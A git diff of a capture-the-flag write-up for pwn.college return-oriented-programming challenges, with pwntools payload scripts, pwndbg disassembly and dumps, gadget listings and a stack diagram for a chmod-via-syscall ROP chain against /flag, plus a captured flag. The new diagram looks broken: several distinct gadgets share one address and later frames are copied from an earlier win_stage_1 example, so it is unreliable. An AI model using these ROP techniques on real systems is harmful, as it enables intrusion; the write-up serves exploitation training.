@@ -774,7 +774,7 @@ hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel 
 
 #### `pop rdi ; ret` gadget
 
-Now, we have to fins the address of the ROP gadget.
+Now, we have to find the address of the ROP gadget.
 
 ```
 hacker@return-oriented-programming~chain-of-command-easy:/$ ROPgadget --binary /challenge/chain-of-command-easy | grep "pop rdi ; ret"
@@ -802,11 +802,10 @@ hacker@return-oriented-programming~chain-of-command-easy:/$ ROPgadget --binary /
 
 Stack:
                            ┌───────────────────────────┐
-rsp --> return address ==> │  00 00 00 00 00 40 2c a3  │ --> pop rdi ; ret
+rsp --> return address ==> │  00 00 00 00 00 40 2c a3  │ --> ( pop rdi ; ret )
+			   │  00 00 00 00 00 00 00 01  │ ( 1 )
 			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-			   │  00 00 00 00 00 00 00 01  │ --> 1
-			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-			   │  00 00 00 00 00 40 2b ba  │ --> win_stage_1()
+			   │  00 00 00 00 00 40 2b ba  │ --> ( win_stage_1() )
 			   └───────────────────────────┘
 			   ╎  .. .. .. .. .. .. .. ..  ╎
 
@@ -817,9 +816,9 @@ rip --> challenge() return
 
 Stack:
 			   ┌───────────────────────────┐
-         	   rsp --> │  00 00 00 00 00 00 00 01  │ --> 1
+         	   rsp --> │  00 00 00 00 00 00 00 01  │ ( 1 )
 			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-			   │  00 00 00 00 00 40 2b ba  │ --> win_stage_1()   
+			   │  00 00 00 00 00 40 2b ba  │ --> ( win_stage_1() ) 
 			   └───────────────────────────┘
 			   ╎  .. .. .. .. .. .. .. ..  ╎
 
@@ -830,7 +829,7 @@ rip --> pop rdi
 
 Stack:
 			   ┌───────────────────────────┐
-		   rsp --> │  00 00 00 00 00 40 2b ba  │ --> win_stage_1()
+		   rsp --> │  00 00 00 00 00 40 2b ba  │ --> ( win_stage_1() )
 			   └───────────────────────────┘
 			   ╎  .. .. .. .. .. .. .. ..  ╎
 
@@ -881,33 +880,33 @@ win_stage_5_arg = 5
 offset = 120
 
 # Gadget address found
-pop_rdi = 0x402ca3
+pop_rdi_ret = 0x402ca3
 
 # Base offset to reach the return address
 payload = b"A" * offset
 
 # Stage 1: win_stage_1(1)
-payload += p64(pop_rdi)
+payload += p64(pop_rdi_ret)
 payload += p64(1)
 payload += p64(win_stage_1_offset)
 
 # Stage 2: win_stage_2(2)
-payload += p64(pop_rdi)
+payload += p64(pop_rdi_ret)
 payload += p64(2)
 payload += p64(win_stage_2_offset)
 
 # Stage 3: win_stage_3(3)
-payload += p64(pop_rdi)
+payload += p64(pop_rdi_ret)
 payload += p64(3)
 payload += p64(win_stage_3_offset)
 
 # Stage 4: win_stage_4(4)
-payload += p64(pop_rdi)
+payload += p64(pop_rdi_ret)
 payload += p64(4)
 payload += p64(win_stage_4_offset)
 
 # Stage 5: win_stage_5(5)
-payload += p64(pop_rdi)
+payload += p64(pop_rdi_ret)
 payload += p64(5)
 payload += p64(win_stage_5_offset)
 
@@ -1404,33 +1403,33 @@ addr_of_saved_ip = 0x7ffd74326e88
 offset = addr_of_saved_ip - buffer_addr
 
 # Gadget address found
-pop_rdi = 0x402643
+pop_rdi_ret = 0x402643
 
 # Base offset to reach the return address
 payload = b"A" * offset
 
 # Stage 1: win_stage_1(1)
-payload += p64(pop_rdi)
+payload += p64(pop_rdi_ret)
 payload += p64(1)
 payload += p64(win_stage_1_offset)
 
 # Stage 2: win_stage_2(2)
-payload += p64(pop_rdi)
+payload += p64(pop_rdi_ret)
 payload += p64(2)
 payload += p64(win_stage_2_offset)
 
 # Stage 3: win_stage_3(3)
-payload += p64(pop_rdi)
+payload += p64(pop_rdi_ret)
 payload += p64(3)
 payload += p64(win_stage_3_offset)
 
 # Stage 4: win_stage_4(4)
-payload += p64(pop_rdi)
+payload += p64(pop_rdi_ret)
 payload += p64(4)
 payload += p64(win_stage_4_offset)
 
 # Stage 5: win_stage_5(5)
-payload += p64(pop_rdi)
+payload += p64(pop_rdi_ret)
 payload += p64(5)
 payload += p64(win_stage_5_offset)
 
@@ -1474,6 +1473,264 @@ pwn.college{EUjrXInTnvQAkZEX53BXXgHbktj.0lN0MDL4ITM0EzW}
 &nbsp;
 
 ## Stop, Pop and ROP (Easy)
+
+```
+hacker@return-oriented-programming~stop-pop-and-rop-easy:~$ /challenge/stop-pop-and-rop-easy 
+###
+### Welcome to /challenge/stop-pop-and-rop-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+ASLR means that the address of the stack is not known,
+but I will simulate a memory disclosure of it.
+By knowing where the stack is, you can now reference data
+that you write onto the stack.
+Be careful: this data could trip up your ROP chain,
+because it could be interpreted as return addresses.
+You can use gadgets that shift the stack appropriately to avoid that.
+[LEAK] Your input buffer is located at: 0x7ffc3ab87820.
+```
+
+So the challenge gives is the location of the buffer. Let's obtain the offset.
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  _init
+0x00000000004010f0  putchar@plt
+0x0000000000401100  __errno_location@plt
+0x0000000000401110  puts@plt
+0x0000000000401120  cs_free@plt
+0x0000000000401130  printf@plt
+0x0000000000401140  read@plt
+0x0000000000401150  strcmp@plt
+0x0000000000401160  cs_disasm@plt
+0x0000000000401170  mincore@plt
+0x0000000000401180  setvbuf@plt
+0x0000000000401190  cs_open@plt
+0x00000000004011a0  cs_close@plt
+0x00000000004011b0  _start
+0x00000000004011e0  _dl_relocate_static_pie
+0x00000000004011f0  deregister_tm_clones
+0x0000000000401220  register_tm_clones
+0x0000000000401260  __do_global_dtors_aux
+0x0000000000401290  frame_dummy
+0x0000000000401296  DUMP_STACK
+0x0000000000401499  print_gadget
+0x000000000040168d  print_chain
+0x00000000004016fb  bin_padding
+0x0000000000401e1a  free_gadgets
+0x0000000000401e65  challenge
+0x000000000040200a  main
+0x00000000004020d0  __libc_csu_init
+0x0000000000402140  __libc_csu_fini
+0x0000000000402148  _fini
+```
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x0000000000401e65 <+0>:     endbr64
+   0x0000000000401e69 <+4>:     push   rbp
+   0x0000000000401e6a <+5>:     mov    rbp,rsp
+   0x0000000000401e6d <+8>:     sub    rsp,0xb0
+   0x0000000000401e74 <+15>:    mov    DWORD PTR [rbp-0x94],edi
+   0x0000000000401e7a <+21>:    mov    QWORD PTR [rbp-0xa0],rsi
+   0x0000000000401e81 <+28>:    mov    QWORD PTR [rbp-0xa8],rdx
+   0x0000000000401e88 <+35>:    lea    rdi,[rip+0x1309]        # 0x403198
+   0x0000000000401e8f <+42>:    call   0x401110 <puts@plt>
+   0x0000000000401e94 <+47>:    lea    rdi,[rip+0x1375]        # 0x403210
+   0x0000000000401e9b <+54>:    call   0x401110 <puts@plt>
+   0x0000000000401ea0 <+59>:    mov    rax,rsp
+   0x0000000000401ea3 <+62>:    mov    QWORD PTR [rip+0x3236],rax        # 0x4050e0 <sp_>
+   0x0000000000401eaa <+69>:    mov    rax,rbp
+   0x0000000000401ead <+72>:    mov    QWORD PTR [rip+0x320c],rax        # 0x4050c0 <bp_>
+   0x0000000000401eb4 <+79>:    mov    rdx,QWORD PTR [rip+0x3205]        # 0x4050c0 <bp_>
+   0x0000000000401ebb <+86>:    mov    rax,QWORD PTR [rip+0x321e]        # 0x4050e0 <sp_>
+   0x0000000000401ec2 <+93>:    sub    rdx,rax
+   0x0000000000401ec5 <+96>:    mov    rax,rdx
+   0x0000000000401ec8 <+99>:    shr    rax,0x3
+   0x0000000000401ecc <+103>:   add    rax,0x2
+   0x0000000000401ed0 <+107>:   mov    QWORD PTR [rip+0x31f9],rax        # 0x4050d0 <sz_>
+   0x0000000000401ed7 <+114>:   mov    rax,QWORD PTR [rip+0x31e2]        # 0x4050c0 <bp_>
+   0x0000000000401ede <+121>:   add    rax,0x8
+   0x0000000000401ee2 <+125>:   mov    QWORD PTR [rip+0x31ef],rax        # 0x4050d8 <rp_>
+   0x0000000000401ee9 <+132>:   lea    rdi,[rip+0x1388]        # 0x403278
+   0x0000000000401ef0 <+139>:   call   0x401110 <puts@plt>
+   0x0000000000401ef5 <+144>:   lea    rdi,[rip+0x13b4]        # 0x4032b0
+   0x0000000000401efc <+151>:   call   0x401110 <puts@plt>
+   0x0000000000401f01 <+156>:   lea    rdi,[rip+0x13d8]        # 0x4032e0
+   0x0000000000401f08 <+163>:   call   0x401110 <puts@plt>
+   0x0000000000401f0d <+168>:   lea    rdi,[rip+0x140c]        # 0x403320
+   0x0000000000401f14 <+175>:   call   0x401110 <puts@plt>
+   0x0000000000401f19 <+180>:   lea    rdi,[rip+0x1420]        # 0x403340
+   0x0000000000401f20 <+187>:   call   0x401110 <puts@plt>
+   0x0000000000401f25 <+192>:   lea    rdi,[rip+0x144c]        # 0x403378
+   0x0000000000401f2c <+199>:   call   0x401110 <puts@plt>
+   0x0000000000401f31 <+204>:   lea    rdi,[rip+0x1478]        # 0x4033b0
+   0x0000000000401f38 <+211>:   call   0x401110 <puts@plt>
+   0x0000000000401f3d <+216>:   lea    rax,[rbp-0x90]
+   0x0000000000401f44 <+223>:   mov    rsi,rax
+   0x0000000000401f47 <+226>:   lea    rdi,[rip+0x14aa]        # 0x4033f8
+   0x0000000000401f4e <+233>:   mov    eax,0x0
+   0x0000000000401f53 <+238>:   call   0x401130 <printf@plt>
+   0x0000000000401f58 <+243>:   lea    rax,[rbp-0x90]
+   0x0000000000401f5f <+250>:   mov    edx,0x1000
+   0x0000000000401f64 <+255>:   mov    rsi,rax
+   0x0000000000401f67 <+258>:   mov    edi,0x0
+   0x0000000000401f6c <+263>:   call   0x401140 <read@plt>
+   0x0000000000401f71 <+268>:   mov    DWORD PTR [rbp-0x4],eax
+   0x0000000000401f74 <+271>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000401f77 <+274>:   cdqe
+   0x0000000000401f79 <+276>:   lea    rcx,[rbp-0x90]
+   0x0000000000401f80 <+283>:   mov    rdx,QWORD PTR [rip+0x3151]        # 0x4050d8 <rp_>
+   0x0000000000401f87 <+290>:   sub    rcx,rdx
+   0x0000000000401f8a <+293>:   mov    rdx,rcx
+   0x0000000000401f8d <+296>:   add    rax,rdx
+   0x0000000000401f90 <+299>:   shr    rax,0x3
+   0x0000000000401f94 <+303>:   mov    rdx,rax
+   0x0000000000401f97 <+306>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000401f9a <+309>:   mov    esi,eax
+   0x0000000000401f9c <+311>:   lea    rdi,[rip+0x1485]        # 0x403428
+   0x0000000000401fa3 <+318>:   mov    eax,0x0
+   0x0000000000401fa8 <+323>:   call   0x401130 <printf@plt>
+   0x0000000000401fad <+328>:   lea    rdi,[rip+0x14ac]        # 0x403460
+   0x0000000000401fb4 <+335>:   call   0x401110 <puts@plt>
+   0x0000000000401fb9 <+340>:   lea    rdi,[rip+0x1508]        # 0x4034c8
+   0x0000000000401fc0 <+347>:   call   0x401110 <puts@plt>
+   0x0000000000401fc5 <+352>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000401fc8 <+355>:   cdqe
+   0x0000000000401fca <+357>:   lea    rcx,[rbp-0x90]
+   0x0000000000401fd1 <+364>:   mov    rdx,QWORD PTR [rip+0x3100]        # 0x4050d8 <rp_>
+   0x0000000000401fd8 <+371>:   sub    rcx,rdx
+   0x0000000000401fdb <+374>:   mov    rdx,rcx
+   0x0000000000401fde <+377>:   add    rax,rdx
+   0x0000000000401fe1 <+380>:   shr    rax,0x3
+   0x0000000000401fe5 <+384>:   add    eax,0x1
+   0x0000000000401fe8 <+387>:   mov    edx,eax
+   0x0000000000401fea <+389>:   mov    rax,QWORD PTR [rip+0x30e7]        # 0x4050d8 <rp_>
+   0x0000000000401ff1 <+396>:   mov    esi,edx
+   0x0000000000401ff3 <+398>:   mov    rdi,rax
+   0x0000000000401ff6 <+401>:   call   0x40168d <print_chain>
+   0x0000000000401ffb <+406>:   lea    rdi,[rip+0x1508]        # 0x40350a
+   0x0000000000402002 <+413>:   call   0x401110 <puts@plt>
+   0x0000000000402007 <+418>:   nop
+   0x0000000000402008 <+419>:   leave
+   0x0000000000402009 <+420>:   ret
+End of assembler dump.
+```
+
+```
+pwndbg> break *(challenge+263)
+Breakpoint 1 at 0x401f6c
+```
+
+```
+pwndbg> run
+Starting program: /challenge/stop-pop-and-rop-easy 
+###
+### Welcome to /challenge/stop-pop-and-rop-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+ASLR means that the address of the stack is not known,
+but I will simulate a memory disclosure of it.
+By knowing where the stack is, you can now reference data
+that you write onto the stack.
+Be careful: this data could trip up your ROP chain,
+because it could be interpreted as return addresses.
+You can use gadgets that shift the stack appropriately to avoid that.
+[LEAK] Your input buffer is located at: 0x7ffd7804eba0.
+
+
+Breakpoint 1, 0x0000000000401f6c in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffd7804eba0 ◂— 0xd68 /* 'h\r' */
+ RBX  0x4020d0 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+ RDX  0x1000
+ RDI  0
+ RSI  0x7ffd7804eba0 ◂— 0xd68 /* 'h\r' */
+ R8   0x39
+ R9   0x39
+ R10  0x403422 ◂— 0x65520000000a0a2e /* '.\n\n' */
+ R11  0x246
+ R12  0x4011b0 (_start) ◂— endbr64 
+ R13  0x7ffd7804ed50 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffd7804ec30 —▸ 0x7ffd7804ec60 ◂— 0
+ RSP  0x7ffd7804eb80 ◂— 0
+ RIP  0x401f6c (challenge+263) ◂— call read@plt
+──────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x401f6c <challenge+263>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/0)
+        buf: 0x7ffd7804eba0 ◂— 0xd68 /* 'h\r' */
+        nbytes: 0x1000
+ 
+   0x401f71 <challenge+268>    mov    dword ptr [rbp - 4], eax
+   0x401f74 <challenge+271>    mov    eax, dword ptr [rbp - 4]
+   0x401f77 <challenge+274>    cdqe   
+   0x401f79 <challenge+276>    lea    rcx, [rbp - 0x90]
+   0x401f80 <challenge+283>    mov    rdx, qword ptr [rip + 0x3151]     RDX, [rp_]
+   0x401f87 <challenge+290>    sub    rcx, rdx
+   0x401f8a <challenge+293>    mov    rdx, rcx
+   0x401f8d <challenge+296>    add    rax, rdx
+   0x401f90 <challenge+299>    shr    rax, 3
+   0x401f94 <challenge+303>    mov    rdx, rax
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffd7804eb80 ◂— 0
+01:0008│-0a8     0x7ffd7804eb88 —▸ 0x7ffd7804ed68 —▸ 0x7ffd7804f67c ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-0a0     0x7ffd7804eb90 —▸ 0x7ffd7804ed58 —▸ 0x7ffd7804f65b ◂— '/challenge/stop-pop-and-rop-easy'
+03:0018│-098     0x7ffd7804eb98 ◂— 0x1fb40c723
+04:0020│ rax rsi 0x7ffd7804eba0 ◂— 0xd68 /* 'h\r' */
+05:0028│-088     0x7ffd7804eba8 —▸ 0x752efb2af951 (_IO_do_write+177) ◂— mov r13, rax
+06:0030│-080     0x7ffd7804ebb0 ◂— 0
+07:0038│-078     0x7ffd7804ebb8 ◂— 0xa /* '\n' */
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x401f6c challenge+263
+   1         0x4020af main+165
+   2   0x752efb243083 __libc_start_main+243
+   3         0x4011de _start+46
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of buffer: `0x7ffd7804eba0`
+- [ ] Location of stored return address to `main()`
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffd7804ec40:
+ rip = 0x401f6c in challenge; saved rip = 0x4020af
+ called by frame at 0x7ffd7804ec70
+ Arglist at 0x7ffd7804ec30, args: 
+ Locals at 0x7ffd7804ec30, Previous frame's sp is 0x7ffd7804ec40
+ Saved registers:
+  rbp at 0x7ffd7804ec30, rip at 0x7ffd7804ec38
+```
+
+- [x] Location of buffer: `0x7ffd7804eba0`
+- [x] Location of stored return address to `main()`: `0x7ffd7804ec38`
+
+Let's get the offset.
+
+```
+pwndbg> p/d 0x7ffd7804ec38 - 0x7ffd7804eba0
+$1 = 152
+```
+
+Now let's look at the ROP gadgets that we have available.
 
 ```
 hacker@return-oriented-programming~stop-pop-and-rop-easy:~$ ROPgadget --binary /challenge/stop-pop-and-rop-easy 
@@ -1639,4 +1896,79 @@ Gadgets information
 0x0000000000401f84 : xor dword ptr [rax], eax ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
 
 Unique gadgets found: 158
+```
+
+Using the information we have, and some of these ROP gadgets, we can craft an exploit which uses `chmod` to change files permissions.
+
+### ROP chain
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
+            0x7ffd7804eba8 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                       ... │  .. .. .. .. .. .. .. ..  │ ( b"AAAAAAAAA" )
+                       ... │  .. .. .. .. .. .. .. ..  │ ( b"AAAAAAAAA" )
+            0x7ffd7804ec30 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+            0x7ffd7804ec38 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rdi ; ret )
+            0x7ffd7804ec40 │  00 00 7f fd 78 04 eb a0  │ --> ( b"/flag\x00\x00\x00" )
+            0x7ffd7804ec48 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rsi ; ret )
+            0x7ffd7804ec50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+            0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
+            0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
+            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> challenge() return
+	// Pop the value pointed to by rsp into rip and move rsp by 8 bytes.
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+                   rsp --> │  00 00 00 00 00 00 00 01  │ --> 1
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                           │  41 41 41 41 41 41 41 41  │ --> win_stage_1()   
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rdi
+	// Pop the value pointed to by rsp into rdi and move the rsp by 8 bytes.
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+			   ┌───────────────────────────┐
+		   rsp --> │  00 00 00 00 00 40 2b ba  │ --> win_stage_1()
+			   └───────────────────────────┘
+			   ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x01
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+	// Pop the address of win_stage_1() pointed to by rsp into rip and move rsp
+        // by 8 bytes.
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+			   ┌───────────────────────────┐
+		   rsp --> │  .. .. .. .. .. .. .. ..  │ 
+			   └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x01
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> win_stage_1()
+	// Call win_stage_1() with the argument that is stored in the rdi register.
+═══════════════════════════════════════════════════════════════════════════════════
 ```
